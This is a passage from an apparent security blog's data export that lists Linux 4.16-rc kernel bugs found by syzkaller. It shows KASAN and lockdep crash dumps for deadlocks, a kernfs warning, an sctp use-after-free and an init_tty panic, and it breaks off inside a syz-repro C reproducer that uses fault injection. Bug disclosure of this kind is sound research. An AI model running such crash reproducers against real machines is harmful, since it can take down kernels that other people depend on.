syscall_slow_exit_work+0x400/0x400\n[  468.039964]  ? security_file_ioctl+0x76/0xb0\n[  468.040460]  ? SyS_sendmmsg+0x2f/0x50\n[  468.040881]  ? __sys_sendmmsg+0x590/0x590\n[  468.041348]  ? do_syscall_64+0x23e/0x7a0\n[  468.041861]  ? put_task_stack+0x13e/0x2c0\n[  468.042306]  ? syscall_return_slowpath+0x470/0x470\n[  468.042861]  ? syscall_return_slowpath+0x2df/0x470\n[  468.043387]  ? prepare_exit_to_usermode+0x330/0x330\n[  468.044024]  ? entry_SYSCALL_64_after_hwframe+0x52/0xb7\n[  468.044647]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[  468.045103]  ? entry_SYSCALL_64_after_hwframe+0x42/0xb7\n[  468.045697] \n[  468.045894] The buggy address belongs to the page:\n[  468.046592] page:ffffea0000b419c0 count:0 mapcount:0 mapping:0000000000000000 index:0x0\n[  468.047381] flags: 0x100000000000000()\n[  468.047787] raw: 0100000000000000 0000000000000000 0000000000000000 00000000ffffffff\n[  468.048497] raw: 0000000000000000 ffffea0000b419e0 0000000000000000 0000000000000000\n[  468.049192] page dumped because: kasan: bad access detected\n[  468.049716] \n[  468.049848] Memory state around the buggy address:\n[  468.050235]  ffff88002d067500: f2 f2 f2 04 f2 f2 f2 f2 f2 f2 f2 00 f2 f2 f2 f2\n[  468.050903]  ffff88002d067580: f2 f2 f2 00 00 00 00 f2 f2 f2 f2 00 00 00 00 00\n[  468.051517] >ffff88002d067600: 00 f2 f2 f2 f2 f2 f2 00 00 00 00 00 00 00 f2 f2\n[  468.052214]                                                              ^\n[  468.052943]  ffff88002d067680: f2 f2 f2 f8 f2 f2 f2 f2 f2 f2 f2 f8 f2 f2 f2 f2\n[  468.053591]  ffff88002d067700: f2 f2 f2 00 f2 f2 f2 f2 f2 f2 f2 00 00 00 f2 f2\n[  468.054259] ==================================================================\n[  468.054863] Disabling lock debugging due to kernel taint\n[  468.055380] Kernel panic - not syncing: panic_on_warn set ...\n```\n\n**End**\n\n\n## __might_fault - dead lock\n\nGot from syzkaller & Found in *LK v4.16.0-rc6*.\n\n### Call Trace (Dump)\n\n```c\nWARNING: possible circular locking dependency detected\n4.16.0-rc6+ #21 Not tainted\n------------------------------------------------------\nsyz-executor3/13637 is trying to acquire lock:\n (&mm->mmap_sem){++++}, at: [<0000000083693474>] __might_fault+0xd4/0x1b0 mm/memory.c:4570\n\nbut task is already holding lock:\n (&rp->fetch_lock){+.+.}, at: [<000000001f43922c>] mon_bin_read+0x5e/0x5f0 drivers/usb/mon/mon_bin.c:813\n\nwhich lock already depends on the new lock.\n\n\nthe existing dependency chain (in reverse order) is:\n\n-> #1 (&rp->fetch_lock){+.+.}:\n\n-> #0 (&mm->mmap_sem){++++}:\n\nother info that might help us debug this:\n\n Possible unsafe locking scenario:\n\n       CPU0                    CPU1\n       ----                    ----\n  lock(&rp->fetch_lock);\n                               lock(&mm->mmap_sem);\n                               lock(&rp->fetch_lock);\n  lock(&mm->mmap_sem);\n\n *** DEADLOCK ***\n \n1 lock held by syz-executor3/13637:\n #0:  (&rp->fetch_lock){+.+.}, at: [<000000001f43922c>] mon_bin_read+0x5e/0x5f0 drivers/usb/mon/mon_bin.c:813\n\nstack backtrace:\nCPU: 1 PID: 13637 Comm: syz-executor3 Not tainted 4.16.0-rc6+ #21\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n __dump_stack lib/dump_stack.c:17 [inline]\n dump_stack+0x10a/0x1dd lib/dump_stack.c:53\n print_circular_bug.isra.33+0x3fe/0x437 kernel/locking/lockdep.c:1223\n check_prev_add kernel/locking/lockdep.c:1863 [inline]\n check_prevs_add kernel/locking/lockdep.c:1976 [inline]\n validate_chain kernel/locking/lockdep.c:2417 [inline]\n __lock_acquire.cold.54+0x57b/0x8e4 kernel/locking/lockdep.c:3431\n```\n\n**End**\n\n\n\n## kernfs_get - warn\n\nFound in *LK v4.16.0-rc6*.\n\n### Call Trace (Dump)\n\n```c\n[   58.664584] Call Trace:\n[   58.664825]  dump_stack+0x10a/0x1dd\n[   58.665129]  ? _atomic_dec_and_lock+0x163/0x163\n[   58.665539]  ? kernfs_get+0x40/0x130\n[   58.665857]  panic+0x1b3/0x3a4\n[   58.666129]  ? add_taint.cold.3+0x16/0x16\n[   58.666486]  ? __warn.cold.6+0x17c/0x1a4\n[   58.666867]  ? kernfs_get+0x10c/0x130\n[   58.667180]  __warn.cold.6+0x197/0x1a4\n[   58.667524]  ? kernfs_get+0x10c/0x130\n[   58.667838]  ? report_bug+0x1fb/0x270\n[   58.668154]  ? fixup_bug.part.9+0x32/0x80\n[   58.668506]  ? do_error_trap+0x28c/0x360\n[   58.668840]  ? lock_acquire+0x4a0/0x4a0\n[   58.669178]  ? do_general_protection+0x310/0x310\n[   58.669601]  ? do_raw_spin_trylock+0x190/0x190\n[   58.670012]  ? __lock_is_held+0xad/0x140\n[   58.670450]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[   58.670858]  ? invalid_op+0x1b/0x40\n[   58.671198]  ? kernfs_get+0x10c/0x130\n[   58.671519]  ? kernfs_get+0x10c/0x130\n[   58.671833]  ? kernfs_evict_inode+0x60/0x60\n[   58.672203]  ? kernfs_path_from_node+0x60/0x60\n[   58.672584]  ? __kernfs_remove+0x277/0xa60\n[   58.672948]  ? kernfs_dir_fop_release+0x40/0x40\n[   58.673346]  ? save_trace+0x300/0x300\n[   58.673653]  ? __kmem_cache_create+0x14b/0x480\n[   58.674075]  ? save_trace+0x300/0x300\n[   58.674402]  ? __lock_is_held+0xad/0x140\n[   58.674731]  ? kernfs_name_hash+0xad/0xe0\n[   58.675113]  ? kernfs_remove_by_name_ns+0x4f/0xb0\n[   58.675503]  ? sysfs_slab_add+0x172/0x230\n[   58.675867]  ? __kmem_cache_create+0x234/0x480\n[   58.676291]  ? kmem_cache_alloc+0x262/0x2a0\n[   58.676697]  ? kmem_cache_create_usercopy+0x266/0x390\n[   58.677199]  ? kmem_cache_create+0xd/0x10\n[   58.677547]  ? hashtab_cache_init+0x20/0x30\n[   58.677992]  ? security_load_policy+0x1c6/0xec0\n[   58.678385]  ? security_get_bools+0x620/0x620\n[   58.678786]  ? __alloc_pages_nodemask+0x91e/0xbe0\n[   58.679196]  ? save_trace+0x300/0x300\n[   58.679517]  ? save_trace+0x300/0x300\n[   58.679897]  ? __vmalloc_node_range+0x1af/0x6d0\n[   58.680324]  ? save_trace+0x300/0x300\n[   58.680700]  ? find_held_lock+0x32/0x1b0\n[   58.681089]  ? __might_fault+0x104/0x1b0\n[   58.681508]  ? lock_acquire+0x4a0/0x4a0\n[   58.681837]  ? lock_downgrade+0x6e0/0x6e0\n[   58.682264]  ? __might_fault+0x177/0x1b0\n[   58.682620]  ? sel_write_load+0x244/0x1620\n[   58.683039]  ? perf_trace_lock_acquire+0xeb/0x930\n[   58.683472]  ? sel_read_bool+0x240/0x240\n[   58.683818]  ? __lock_is_held+0xad/0x140\n[   58.684224]  ? rcu_note_context_switch+0x710/0x710\n[   58.684648]  ? lock_acquire+0x4a0/0x4a0\n[   58.685009]  ? save_trace+0x300/0x300\n[   58.685379]  ? _cond_resched+0x10/0x20\n[   58.685730]  ? __inode_security_revalidate+0xd5/0x130\n[   58.686159]  ? avc_policy_seqno+0x5/0x10\n[   58.686522]  ? selinux_file_permission+0x79/0x440\n[   58.686927]  ? security_file_permission+0x82/0x1d0\n[   58.687375]  ? do_iter_write+0x3c3/0x530\n[   58.687722]  ? rcu_sync_lockdep_assert+0x69/0xa0\n[   58.688164]  ? __sb_start_write+0x1ff/0x290\n[   58.688609]  ? vfs_writev+0x1d3/0x330\n[   58.688968]  ? rcutorture_record_progress+0x10/0x10\n[   58.689403]  ? vfs_iter_write+0xa0/0xa0\n[   58.689731]  ? __fd_install+0x290/0x6e0\n[   58.690062]  ? __fget_light+0x28c/0x3a0\n[   58.690450]  ? fget_raw+0x20/0x20\n[   58.690746]  ? rcu_pm_notify+0xc0/0xc0\n[   58.691081]  ? SyS_futex+0x261/0x31e\n[   58.691432]  ? SyS_futex+0x26a/0x31e\n[   58.691787]  ? do_pwritev+0x190/0x220\n[   58.692146]  ? do_writev+0x2a0/0x2a0\n[   58.692501]  ? security_file_ioctl+0x76/0xb0\n[   58.692906]  ? do_syscall_64+0xb0/0x7a0\n[   58.693311]  ? SyS_preadv2+0x70/0x70\n[   58.693646]  ? do_syscall_64+0x23e/0x7a0\n[   58.694019]  ? _raw_spin_unlock_irq+0x24/0x40\n[   58.694405]  ? finish_task_switch+0x1c2/0x740\n[   58.694805]  ? syscall_return_slowpath+0x470/0x470\n[   58.695229]  ? syscall_return_slowpath+0x2df/0x470\n[   58.695687]  ? prepare_exit_to_usermode+0x330/0x330\n[   58.696143]  ? entry_SYSCALL_64_after_hwframe+0x52/0xb7\n[   58.696603]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[   58.697010]  ? entry_SYSCALL_64_after_hwframe+0x42/0xb7\n[   58.697669] Dumping ftrace buffer:\n[   58.698098]    (ftrace buffer empty)\n[   58.698417] Kernel Offset: 0x23000000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)\n[   58.699323] Rebooting in 86400 seconds..\n```\n\n### Code\n\nIn  ```fs/kernfs/dir.c Line 494```.\n\n```c\n/**\n * kernfs_get - get a reference count on a kernfs_node\n * @kn: the target kernfs_node\n */\nvoid kernfs_get(struct kernfs_node *kn)\n{\n\tif (kn) {\n\t\tWARN_ON(!atomic_read(&kn->count));\n\t\tatomic_inc(&kn->count);\n\t}\n}\n```\n\n\n## mon_bin_vma_fault - dead lock\n\nGot from syzkaller & Found in *LK v4.16.0-rc6*.\n\n### Call Trace (Dump)\n\n```c\n[  105.403185] WARNING: possible circular locking dependency detected\n[  105.403862] 4.16.0-rc6+ #21 Not tainted\n[  105.404291] ------------------------------------------------------\n[  105.404959] syz-executor4/18491 is trying to acquire lock:\n[  105.405516]  (&rp->fetch_lock){+.+.}, at: [<000000004f37fa18>] mon_bin_vma_fault+0xc9/0x3b0\n[  105.406243] \n[  105.406243] but task is already holding lock:\n[  105.406727]  (&mm->mmap_sem){++++}, at: [<00000000106c8ac7>] __mm_populate+0x29e/0x410\n[  105.407392] \n[  105.407392] which lock already depends on the new lock.\n[  105.407392] \n[  105.408085] \n[  105.408085] the existing dependency chain (in reverse order) is:\n[  105.408707] \n[  105.408707] -> #1 (&mm->mmap_sem){++++}:\n[  105.409322] \n[  105.409322] -> #0 (&rp->fetch_lock){+.+.}:\n[  105.409916] \n[  105.409916] other info that might help us debug this:\n[  105.409916] \n[  105.410766]  Possible unsafe locking scenario:\n[  105.410766] \n[  105.411313]        CPU0                    CPU1\n[  105.411807]        ----                    ----\n[  105.412296]   lock(&mm->mmap_sem);\n[  105.412672]                                lock(&rp->fetch_lock);\n[  105.413300]                                lock(&mm->mmap_sem);\n[  105.413944]   lock(&rp->fetch_lock);\n[  105.414286] \n[  105.414286]  *** DEADLOCK ***\n[  105.414286] \n[  105.414844] 1 lock held by syz-executor4/18491:\n[  105.415306]  #0:  (&mm->mmap_sem){++++}, at: [<00000000106c8ac7>] __mm_populate+0x29e/0x410\n[  105.416133] \n[  105.416133] stack backtrace:\n[  105.416577] CPU: 0 PID: 18491 Comm: syz-executor4 Not tainted 4.16.0-rc6+ #21\n[  105.417270] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\n[  105.418181] Call Trace:\n[  105.418455]  dump_stack+0x10a/0x1dd\n[  105.418872]  ? _atomic_dec_and_lock+0x163/0x163\n[  105.419324]  ? __mm_populate+0x29e/0x410\n[  105.419714]  ? __mm_populate+0x29e/0x410\n[  105.420105]  print_circular_bug.isra.33+0x3fe/0x437\n[  105.420588]  ? print_circular_bug_header+0x11b/0x11b\n[  105.421073]  ? find_usage_backwards+0x30/0x30\n[  105.421504]  __lock_acquire.cold.54+0x57b/0x8e4\n[  105.421945]  ? lock_acquire+0x4a0/0x4a0\n[  105.422341]  ? debug_check_no_locks_freed+0x210/0x210\n[  105.422836]  ? set_next_entity+0x10c9/0x2d80\n[  105.423255]  ? __lock_is_held+0xad/0x140\n[  105.423647]  ? reweight_entity+0xfe0/0xfe0\n[  105.424059]  ? print_usage_bug+0x140/0x140\n[  105.424495]  ? put_prev_task_fair+0x70/0x70\n[  105.424909]  ? __lock_acquire+0x911/0x4670\n[  105.425323]  ? task_tick_fair+0x1ff0/0x1ff0\n[  105.425731]  ? dequeue_task_fair+0x1586/0x3730\n[  105.426169]  ? debug_check_no_locks_freed+0x210/0x210\n[  105.426671]  ? perf_trace_lock_acquire+0xeb/0x930\n[  105.427128]  ? __lock_acquire+0x911/0x4670\n[  105.427540]  ? put_prev_task_fair+0x70/0x70\n[  105.427950]  ? perf_trace_lock+0x950/0x950\n[  105.428364]  ? debug_check_no_locks_freed+0x210/0x210\n[  105.428856]  ? save_trace+0x300/0x300\n[  105.429232]  ? print_usage_bug+0x140/0x140\n[  105.429640]  ? print_usage_bug+0x140/0x140\n[  105.430041]  ? print_usage_bug+0x140/0x140\n[  105.430470]  ? lock_acquire+0x1a5/0x4a0\n[  105.430868]  ? mon_bin_vma_fault+0xc9/0x3b0\n[  105.431298]  ? lock_downgrade+0x6e0/0x6e0\n[  105.431705]  ? mon_bin_vma_fault+0xc9/0x3b0\n[  105.432099]  ? rcu_note_context_switch+0x710/0x710\n[  105.432560]  ? print_usage_bug+0x140/0x140\n[  105.432962]  ? mon_bin_vma_fault+0xc9/0x3b0\n[  105.433374]  ? __mutex_lock+0x178/0x19d0\n[  105.433757]  ? mon_bin_vma_fault+0xc9/0x3b0\n[  105.434181]  ? check_chain_key+0x3c0/0x3c0\n[  105.434588]  ? mon_bin_vma_fault+0xc9/0x3b0\n[  105.434998]  ? __lock_acquire+0x911/0x4670\n[  105.435420]  ? mark_held_locks+0xa8/0xf0\n[  105.435807]  ? mutex_lock_io_nested+0x1830/0x1830\n[  105.436311]  ? print_usage_bug+0x140/0x140\n[  105.436733]  ? print_usage_bug+0x140/0x140\n[  105.437152]  ? debug_check_no_locks_freed+0x210/0x210\n[  105.437636]  ? __page_frag_cache_drain+0x1b0/0x1b0\n[  105.438105]  ? print_usage_bug+0x140/0x140\n[  105.438515]  ? deref_stack_reg+0xab/0x110\n[  105.438909]  ? __read_once_size_nocheck.constprop.8+0x10/0x10\n[  105.439478]  ? print_usage_bug+0x140/0x140\n[  105.439879]  ? print_usage_bug+0x140/0x140\n[  105.440283]  ? print_usage_bug+0x140/0x140\n[  105.440695]  ? unwind_next_frame+0x11c2/0x1d10\n[  105.441137]  ? __save_stack_trace+0x59/0xf0\n[  105.441553]  ? print_usage_bug+0x140/0x140\n[  105.441970]  ? __lock_acquire+0x911/0x4670\n[  105.442349]  ? debug_check_no_locks_freed+0x210/0x210\n[  105.442867]  ? debug_check_no_locks_freed+0x210/0x210\n[  105.443368]  ? _cond_resched+0x10/0x20\n[  105.443753]  ? mon_bin_vma_fault+0xc9/0x3b0\n[  105.444176]  ? mon_bin_vma_fault+0xc9/0x3b0\n[  105.444594]  ? mon_alloc_buff+0x200/0x200\n[  105.444997]  ? print_usage_bug+0x140/0x140\n[  105.445434]  ? __lock_acquire+0x911/0x4670\n[  105.445869]  ? debug_check_no_locks_freed+0x210/0x210\n[  105.446330]  ? __do_fault+0xe2/0x380\n[  105.446696]  ? print_bad_pte+0x5d0/0x5d0\n[  105.447078]  ? debug_check_no_locks_freed+0x210/0x210\n[  105.447555]  ? debug_check_no_locks_freed+0x210/0x210\n[  105.448060]  ? unlink_anon_vmas+0x3e2/0x920\n[  105.448485]  ? unlink_anon_vmas+0x1ef/0x920\n[  105.448910]  ? __handle_mm_fault+0x1206/0x31b0\n[  105.449347]  ? vm_insert_mixed_mkwrite+0x30/0x30\n[  105.449804]  ? __lock_acquire+0x911/0x4670\n[  105.450208]  ? perf_trace_lock+0x950/0x950\n[  105.450622]  ? debug_check_no_locks_freed+0x210/0x210\n[  105.451104]  ? perf_trace_lock_acquire+0xeb/0x930\n[  105.451534]  ? perf_trace_lock_acquire+0xeb/0x930\n[  105.452029]  ? pud_huge+0x5c/0xc0\n[  105.452346]  ? pmd_huge+0xe0/0xe0\n[  105.452710]  ? perf_trace_lock_acquire+0xeb/0x930\n[  105.453303]  ? follow_page_mask+0x129/0x14c0\n[  105.453825]  ? save_trace+0x300/0x300\n[  105.454194]  ? perf_trace_lock+0x950/0x950\n[  105.454546]  ? save_trace+0x300/0x300\n[  105.454886]  ? gup_pgd_range+0x22f0/0x22f0\n[  105.455241]  ? save_trace+0x300/0x300\n[  105.455556]  ? save_trace+0x300/0x300\n[  105.455891]  ? save_stack+0x89/0xb0\n[  105.456174]  ? __lock_is_held+0xad/0x140\n[  105.456489]  ? handle_mm_fault+0x12e/0x390\n[  105.456852]  ? __get_user_pages+0x619/0x13e0\n[  105.457202]  ? follow_page_mask+0x14c0/0x14c0\n[  105.457557]  ? vma_set_page_prot+0x155/0x220\n[  105.457943]  ? vma_wants_writenotify+0x430/0x430\n[  105.458291]  ? __mm_populate+0x29e/0x410\n[  105.458587]  ? lock_downgrade+0x6e0/0x6e0\n[  105.459002]  ? rcu_note_context_switch+0x710/0x710\n[  105.459481]  ? populate_vma_page_range+0x201/0x2f0\n[  105.459953]  ? get_user_pages_unlocked+0x4a0/0x4a0\n[  105.460427]  ? vmacache_find+0x58/0x270\n[  105.460810]  ? vmacache_update+0xc9/0x120\n[  105.461206]  ? __mm_populate+0x222/0x410\n[  105.461589]  ? populate_vma_page_range+0x2f0/0x2f0\n[  105.462022]  ? security_mmap_file+0x13b/0x170\n[  105.462393]  ? vm_mmap_pgoff+0x226/0x260\n[  105.462784]  ? vma_is_stack_for_current+0xb0/0xb0\n[  105.463147]  ? SyS_futex+0x261/0x31e\n[  105.463425]  ? SyS_futex+0x26a/0x31e\n[  105.463753]  ? SyS_mmap_pgoff+0x445/0x5c0\n[  105.464159]  ? find_mergeable_anon_vma+0xc0/0xc0\n[  105.464608]  ? security_file_ioctl+0x76/0xb0\n[  105.465034]  ? do_syscall_64+0xb0/0x7a0\n[  105.465410]  ? align_vdso_addr+0x50/0x50\n[  105.465808]  ? do_syscall_64+0x23e/0x7a0\n[  105.466196]  ? exit_to_usermode_loop+0x181/0x1e0\n[  105.466645]  ? _raw_spin_unlock_irq+0x24/0x40\n[  105.467082]  ? syscall_return_slowpath+0x470/0x470\n[  105.467555]  ? syscall_return_slowpath+0x2df/0x470\n[  105.468055]  ? entry_SYSCALL_64_after_hwframe+0x52/0xb7\n[  105.468561]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[  105.469029]  ? entry_SYSCALL_64_after_hwframe+0x42/0xb7\n```\n\n**End**\n\n\n","excerpt":"perf_trace_buf_alloc - warn Found in LK v4.16.0-rc5. Call Trace (Dump) Code In . Just size is over , so WARN_ONCE is just called... And all…","fields":{"slug":"/2018-03-3-Founds/"},"frontmatter":{"date":"Mar 16, 2018","title":"Linux Kernel - 2018-03-3 Founds","tags":["Security","Linux-Kernel"],"update":"Mar 22, 2018"},"timeToRead":22}},{"node":{"rawMarkdownBody":"\n## sctp_id2assoc - use after free Read\n\nFound in LK v4.16.0-rc4. Maybe it could be useful :)\n\n### Call Trace (Dump)\n\n```c\n[   50.782403] Call Trace:\n[   50.782662]  dump_stack+0x10a/0x1dd\n[   50.783020]  ? _atomic_dec_and_lock+0x163/0x163\n[   50.783469]  ? show_regs_print_info+0x12/0x12\n[   50.783925]  print_address_description+0x60/0x224\n[   50.784395]  kasan_report+0x196/0x2a0\n[   50.784758]  ? sctp_id2assoc+0x350/0x370\n[   50.785139]  ? sctp_id2assoc+0x350/0x370\n[   50.785497]  ? sctp_wfree+0x660/0x660\n[   50.785818]  ? __might_fault+0x177/0x1b0\n[   50.786163]  ? sctp_getsockopt+0x402e/0x721a\n[   50.786555]  ? _raw_spin_unlock_irq+0x24/0x40\n[   50.786931]  ? finish_task_switch+0x1c2/0x740\n[   50.787304]  ? finish_task_switch+0x182/0x740\n[   50.787683]  ? sctp_getsockopt_peeloff_common+0x350/0x350\n[   50.788143]  ? lock_repin_lock+0x410/0x410\n[   50.788503]  ? __schedule+0x752/0x1ce0\n[   50.788835]  ? select_task_rq_fair+0x1196/0x35d0\n[   50.789231]  ? print_usage_bug+0x140/0x140\n[   50.789616]  ? save_trace+0x300/0x300\n[   50.789946]  ? active_load_balance_cpu_stop+0xfb0/0xfb0\n[   50.790429]  ? put_prev_task_fair+0x70/0x70\n[   50.790812]  ? find_held_lock+0x32/0x1b0\n[   50.791165]  ? schedule+0xf0/0x3a0\n[   50.791484]  ? __schedule+0x1ce0/0x1ce0\n[   50.791842]  ? __lock_acquire+0x911/0x4670\n[   50.792223]  ? rcu_note_context_switch+0x710/0x710\n[   50.792656]  ? futex_wait_setup+0x128/0x380\n[   50.793053]  ? debug_check_no_locks_freed+0x210/0x210\n[   50.793526]  ? get_futex_value_locked+0xc0/0xf0\n[   50.793947]  ? futex_wait_setup+0x1f9/0x380\n[   50.794343]  ? find_held_lock+0x32/0x1b0\n[   50.794686]  ? futex_wake+0x630/0x630\n[   50.795016]  ? futex_wake+0x528/0x630\n[   50.795343]  ? drop_futex_key_refs.isra.13+0x51/0xa0\n[   50.795778]  ? futex_wait+0x637/0x930\n[   50.796132]  ? futex_wait_setup+0x380/0x380\n[   50.796521]  ? mark_wake_futex+0xba/0x1d0\n[   50.796877]  ? wake_up_q+0x97/0xe0\n[   50.797177]  ? drop_futex_key_refs.isra.13+0x51/0xa0\n[   50.797621]  ? futex_wake+0x2ac/0x630\n[   50.797952]  ? save_trace+0x300/0x300\n[   50.798270]  ? lock_acquire+0x4a0/0x4a0\n[   50.798624]  ? finish_task_switch+0x182/0x740\n[   50.799014]  ? do_futex+0x7da/0x1f50\n[   50.799341]  ? find_held_lock+0x32/0x1b0\n[   50.799683]  ? lock_acquire+0x4a0/0x4a0\n[   50.800017]  ? lock_downgrade+0x6e0/0x6e0\n[   50.800365]  ? set_load_weight+0x270/0x270\n[   50.800730]  ? rcutorture_record_progress+0x10/0x10\n[   50.801179]  ? __fget+0x386/0x5b0\n[   50.801496]  ? iterate_fd+0x3d0/0x3d0\n[   50.801837]  ? find_held_lock+0x32/0x1b0\n[   50.802181]  ? release_sock+0x1d0/0x280\n[   50.802537]  ? lock_acquire+0x4a0/0x4a0\n[   50.802897]  ? __fget_light+0x28c/0x3a0\n[   50.803230]  ? rcutorture_record_progress+0x10/0x10\n[   50.803648]  ? sock_has_perm+0x26e/0x360\n[   50.804023]  ? selinux_secmark_relabel_packet+0xc0/0xc0\n[   50.804535]  ? schedule+0xf0/0x3a0\n[   50.804953]  ? __release_sock+0x350/0x350\n[   50.805394]  ? mark_held_locks+0xa8/0xf0\n[   50.805837]  ? SyS_getsockopt+0x153/0x310\n[   50.806279]  ? SyS_getsockopt+0x153/0x310\n[   50.806732]  ? SyS_setsockopt+0x340/0x340\n[   50.807173]  ? exit_to_usermode_loop+0x181/0x1e0\n[   50.807670]  ? syscall_slow_exit_work+0x400/0x400\n[   50.808058]  ? do_syscall_64+0xb0/0x7a0\n[   50.808359]  ? SyS_setsockopt+0x340/0x340\n[   50.808692]  ? do_syscall_64+0x23e/0x7a0\n[   50.809007]  ? _raw_spin_unlock_irq+0x24/0x40\n[   50.809350]  ? finish_task_switch+0x1c2/0x740\n[   50.809726]  ? syscall_return_slowpath+0x470/0x470\n[   50.810106]  ? syscall_return_slowpath+0x2df/0x470\n[   50.810480]  ? prepare_exit_to_usermode+0x330/0x330\n[   50.810876]  ? entry_SYSCALL_64_after_hwframe+0x52/0xb7\n[   50.811284]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[   50.811666]  ? entry_SYSCALL_64_after_hwframe+0x42/0xb7\n[   50.812079] \n[   50.812206] Allocated by task 11561:\n[   50.812505]  kasan_kmalloc+0xbf/0xe0\n[   50.812798]  kmem_cache_alloc_trace+0x142/0x2f0\n[   50.813150]  sctp_association_new+0x10e/0x2060\n[   50.813525]  __sctp_connect+0x5a3/0xc20\n[   50.813827]  __sctp_setsockopt_connectx+0x61/0xc0\n[   50.814355]  sctp_getsockopt+0x163d/0x721a\n[   50.814760] \n[   50.814920] Freed by task 11551:\n[   50.815252]  __kasan_slab_free+0x12c/0x170\n[   50.815655]  kfree+0xf3/0x2e0\n[   50.815953]  sctp_association_put+0x20b/0x300\n[   50.816385]  sctp_association_free+0x631/0x880\n[   50.816831]  sctp_do_sm+0x2b04/0x65d0\n[   50.817198] \n[   50.817359] The buggy address belongs to the object at ffff88007d62b300\n[   50.817359]  which belongs to the cache kmalloc-4096 of size 4096\n[   50.818653] The buggy address is located 32 bytes inside of\n[   50.818653]  4096-byte region [ffff88007d62b300, ffff88007d62c300)\n[   50.819783] The buggy address belongs to the page:\n[   50.820258] page:ffffea0001f58a00 count:1 mapcount:0 mapping:0000000000000000 index:0x0 compound_mapcount: 0\n[   50.821216] flags: 0x500000000008100(slab|head)\n[   50.821660] raw: 0500000000008100 0000000000000000 0000000000000000 0000000180070007\n[   50.822410] raw: 0000000000000000 0000000100000001 ffff88002dc02c00 0000000000000000\n[   50.823160] page dumped because: kasan: bad access detected\n[   50.823701] \n[   50.823860] Memory state around the buggy address:\n[   50.824350]  ffff88007d62b200: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n[   50.825062]  ffff88007d62b280: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n[   50.825733] >ffff88007d62b300: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n[   50.826388]                                ^\n[   50.826776]  ffff88007d62b380: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n[   50.827424]  ffff88007d62b400: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n[   50.828079] ==================================================================\n[   50.828719] Disabling lock debugging due to kernel taint\n[   50.829292] Kernel panic - not syncing: panic_on_warn set ...\n[   50.829292] \n[   50.830148] CPU: 1 PID: 11561 Comm: rs:main Q:Reg Tainted: G    B            4.16.0-rc4+ #9\n```\n\n**End**\n\n## init_tty - kernel panic\n\nGot from syzkaller & Found in *LK v4.16.0-rc5* with enabling ```CONFIG_FAULT_INJECTION```.\n\n### Call Trace (Dump)\n\n```c\n[ 2785.690162] Kernel panic - not syncing: n_tty: init_tty\n[ 2785.690762] CPU: 0 PID: 29293 Comm: syz-executor4 Not tainted 4.16.0-rc5+ #12\n[ 2785.691616] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\n[ 2785.692623] Call Trace:\n[ 2785.692919]  dump_stack+0xb9/0x11b\n[ 2785.693317]  panic+0x10a/0x2d6\n[ 2785.693684]  tty_ldisc_init.cold.6+0x11/0x1a\n[ 2785.694182]  ? alloc_tty_struct+0x61/0x2c0\n[ 2785.694702]  ? tty_init_dev+0x4c/0x210\n[ 2785.695153]  ? ptmx_open+0xd2/0x1c0\n[ 2785.695566]  ? pty_resize+0xf0/0xf0\n[ 2785.695981]  ? chrdev_open+0xe2/0x270\n[ 2785.696414]  ? cdev_put.part.0+0x20/0x20\n[ 2785.696870]  ? do_dentry_open+0x27a/0x420\n[ 2785.697357]  ? vfs_open+0x70/0xb0\n[ 2785.697747]  ? path_openat+0x2a0/0x1060\n[ 2785.698198]  ? do_filp_open+0xac/0x130\n[ 2785.698659]  ? __alloc_fd+0x200/0x230\n[ 2785.699089]  ? _raw_spin_unlock+0x1f/0x30\n[ 2785.699562]  ? do_sys_open+0x2b1/0x350\n[ 2785.700002]  ? do_syscall_64+0x73/0x1f0\n[ 2785.700451]  ? entry_SYSCALL_64_after_hwframe+0x42/0xb7\n[ 2785.701306] Dumping ftrace buffer:\n[ 2785.701807]    (ftrace buffer empty)\n[ 2785.702234] Kernel Offset: 0x30e00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)\n[ 2785.703442] Rebooting in 86400 seconds..\n```\n\n### PoC\n\nReproducible code generated by syz-repro.\n\n```c\n#define _GNU_SOURCE \n#include <endian.h>\n#include <sys/syscall.h>\n#include <unistd.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <stdarg.h>\n#include <stdbool.h>\n#include <stdio.h>\n#include <sys/stat.h>\n\n__attribute__((noreturn)) static void doexit(int status)\n{\n\tvolatile unsigned i;\n\tsyscall(__NR_exit_group, status);\n\tfor (i = 0;; i++) {\n\t}\n}\n#include <stdint.h>\n#include <string.h>\n\nconst int kFailStatus = 67;\nconst int kRetryStatus = 69;\n\nstatic void exitf(const char* msg, ...)\n{\n\tint e = errno;\n\tva_list args;\n\tva_start(args, msg);\n\tvfprintf(stderr, msg, args);\n\tva_end(args);\n\tfprintf(stderr, \" (errno %d)\\n\", e);\n\tdoexit(kRetryStatus);\n}\n\nstatic bool write_file(const char* file, const char* what, ...)\n{\n\tchar buf[1024];\n\tva_list args;\n\tva_start(args, what);\n\tvsnprintf(buf, sizeof(buf), what, args);\n\tva_end(args);\n\tbuf[sizeof(buf) - 1] = 0;\n\tint len = strlen(buf);\n\n\tint fd = open(file, O_WRONLY | O_CLOEXEC);\n\tif (fd == -1)\n\t\treturn false;\n\tif (write(fd, buf, len) != len) {\n\t\tclose(fd);\n\t\treturn false;\n\t}\n\tclose(fd);\n\treturn true;\n}\n\nstatic int inject_fault(int nth)\n{\n\tint fd;\n\tchar buf[16];\n\n\tfd = open(\"/proc/thread-self/fail-nth\", O_RDWR);\n\tif (fd == -1)\n\t\texitf(\"failed to open /proc/thread-self/fail-nth\");\n\tsprintf(buf, \"%d\", nth + 